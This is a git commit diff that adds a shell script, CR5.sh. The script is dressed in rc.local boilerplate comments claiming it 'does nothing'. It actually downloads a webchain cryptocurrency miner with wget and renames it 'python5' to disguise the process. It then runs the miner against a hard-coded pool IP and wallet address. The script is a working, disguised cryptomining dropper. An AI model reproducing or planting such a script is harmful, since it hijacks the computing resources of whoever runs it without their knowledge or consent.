05ca835ac69813ed036d13672ae1459f84a89241
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-04-09 09:57:01 +0700

    Update and rename Vina.sh to CR5.sh

---
+++ CR5.sh
@@ -0,0 +1,35 @@
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+if [ -f ${PWD}/python5 ]; then
+    if pgrep -x "python5" > /dev/null
+then
+    echo "Miner dang chay roi , ke cmn di "
+    
+else
+
+echo "Miner da install , chay thoi "
+./python5 -o 42.119.159.78:4444 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+
+     
+fi
+exit
+fi
+
+
+wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
+tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
+mv webchain-miner python5
+rm config.json
+./python5 -o 42.119.159.78:4444 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+
+exit 0
